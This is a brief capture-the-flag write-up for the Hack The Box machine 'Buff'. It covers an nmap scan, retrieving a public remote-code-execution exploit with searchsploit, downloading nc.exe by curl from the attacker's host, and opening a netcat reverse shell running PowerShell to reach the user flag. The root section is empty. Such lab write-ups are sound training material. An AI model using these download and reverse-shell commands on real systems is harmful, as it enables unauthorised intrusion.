# -HTB-Buff


### I start with nmap 


```
nmap -p- -sVC 10.10.10.198 -oN nmap_scan --min-rate 5000
```

<img width="1185" height="302" alt="image" src="https://github.com/user-attachments/assets/a1c47b7e-1faa-4eb8-9317-65e22bebb411" />


### On port 8080, in contact.php we can see the site name and version

<img width="763" height="184" alt="image" src="https://github.com/user-attachments/assets/f38a97d7-94ea-4edb-9266-3e14bfd576b9" />


### I used searchsploit and found multiple results , i chose the remote code execution one:

```
searchsploit -m php/webapps/48506.py 
```


<img width="1391" height="208" alt="image" src="https://github.com/user-attachments/assets/7b4ebe7b-278e-454d-a1b3-49382ebb14c2" />

### I tried with python 3, but it didn t work because it requires python 2.


<img width="905" height="112" alt="image" src="https://github.com/user-attachments/assets/c87844cf-bdbd-4309-a15c-7e72a8bcb89f" />


<img width="620" height="246" alt="image" src="https://github.com/user-attachments/assets/0c4867f6-de82-467d-beb7-d38b6923a5b9" />


### Because every time we run a command we can t change directory, so let s spawn a reverse shell.


<img width="675" height="448" alt="image" src="https://github.com/user-attachments/assets/34eaea54-83a8-4186-9c8e-af0e3def70af" />


### We have curl , so we can downlad nc 

```
curl http://10.10.14.25:8000/nc.exe -o nc.exe
```




<img width="695" height="379" alt="image" src="https://github.com/user-attachments/assets/c62819ff-6c6a-4c3e-822f-d5f7e2e02c64" />

<img width="781" height="333" alt="image" src="https://github.com/user-attachments/assets/300e21f1-7605-44b0-879b-1139a92716d6" />


### And run nc 

```
nc.exe 10.10.14.25 1337 -e powershell
```

<img width="821" height="368" alt="image" src="https://github.com/user-attachments/assets/31e1f7fe-9d00-470c-a3fe-66363f6da184" />


### On the desktop of the user shaun we find the users flag

<img width="354" height="85" alt="image" src="https://github.com/user-attachments/assets/a5282bc8-9e8c-44e9-9f8e-b23f0d152a1a" />



# Root 
...


